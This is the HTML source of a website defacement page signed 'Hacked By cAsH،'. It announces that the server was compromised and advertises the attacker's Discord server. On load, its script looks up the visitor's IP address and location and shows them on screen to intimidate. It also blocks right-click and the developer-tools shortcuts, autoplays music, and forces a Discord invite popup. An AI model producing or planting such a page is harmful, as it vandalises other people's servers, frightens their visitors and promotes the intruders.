<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>cAsH</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            background: black;
            font-family: Arial, sans-serif;
        }

        body {
            user-select: none;
        }

        video {
            position: fixed;
            top: 0;
            left: 0;
            z-index: -1;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
        }

        .cmd-text-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .cmd-text {
            color: red;
            font-size: 17px;
            white-space: nowrap;
            animation: scrollText 20s linear infinite;
            -webkit-text-stroke: 1px white;
        }

        @keyframes scrollText {
            0% { transform: translateX(100%); }
            100% { transform: translateX(-100%); }
        }

        .animated-text {
            animation: lightning 1s linear infinite;
            color: red;
        }

        @keyframes lightning {
            0% { color: red; }
            50% { color: black; }
            100% { color: white; }
        }

        .json-data {
            color: rgb(139, 69, 19);
            text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
        }
    </style>
</head>
<body>

    <!-- Background Video -->
    <video autoplay loop muted playsinline>
        <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1397740672131534948/v10044g50000c5c74tjc77u3u3n8uqkg_1.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <!-- Title -->
    <p align="center">
        <font face="Courier" size="6">
            <span style="color: rgb(210, 105, 30);">Hacked By</span>
            <span id="name" style="color: red;">[ cAsH، ]</span>
        </font>
    </p>

    <!-- Discord Link -->
    <p align="center">
        <b><font face="Courier">
            <a href="https://discord.gg/ay1" target="_blank" style="font-size: 24px; color: rgb(210, 105, 30); text-decoration: none;">Discord.gg/ay1</a>
        </font></b>
    </p>

    <!-- Animated Warning -->
    <h3 class="animated-text" align="center">cAsH، fucked the server</h3>

    <!-- IP Info -->
    <div style="text-align: center; max-width: 600px; margin: 30px auto;">
        <p>
            <span style="color: white;">Your IP Address: </span>
            <span id="ip-address-value" class="json-data">Loading...</span>
        </p>

        <h3 style="color: white;">Your IP Info :</h3>
        <pre id="ip-info" class="json-data">Loading...</pre>
    </div>

    <!-- Scrolling Text -->
    <div class="cmd-text-container">
        <div class="cmd-text">You got hacked by cAsH،</div>
    </div>

    <!-- Final Message -->
    <p align="center" style="color: red; font-size: 24px;">Oops, your server is down!</p>

    <!-- JavaScript -->
    <script>
        const names = [
            { name: "[ cAsH، ]", color: "red" },
            { name: "[ cAsH، ]", color: "white" }
        ];
        let nameIndex = 0;

        function changeName() {
            const nameElem = document.getElementById("name");
            nameElem.textContent = names[nameIndex].name;
            nameElem.style.color = names[nameIndex].color;
            nameIndex = (nameIndex + 1) % names.length;
        }
        setInterval(changeName, 1000);

        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.key === "U")) {
                e.preventDefault();
            }
        });

        function fetchIPInfo() {
            fetch('https://api.ipify.org/?format=json')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('ip-address-value').textContent = data.ip;
                    return fetch(`https://ipinfo.io/${data.ip}/json`);
                })
                .then(res => res.json())
                .then(info => {
                    document.getElementById('ip-info').textContent = JSON.stringify(info, null, 2);
                })
                .catch(() => {
                    document.getElementById('ip-address-value').textContent = 'Failed';
                    document.getElementById('ip-info').textContent = 'Could not load info';
                });
        }

        function playMusic() {
            const audio = new Audio("https://cdn.discordapp.com/attachments/1069599369529135146/1397740594801147935/Dark_is_the_night_-_slowed_soviet_song.mp3");
            audio.loop = true;
            audio.volume = 0.5;
            audio.play().catch(() => {
                console.warn("Autoplay blocked by browser.");
            });
        }

        function forceDiscordPopup() {
            const link = document.createElement('a');
            link.href = "https://discord.com/invite/ay1";
            link.target = "_blank";
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        window.onload = () => {
            fetchIPInfo();
            playMusic();

            setTimeout(forceDiscordPopup, 100); // fire early
        };
    </script>

</body>
</html>
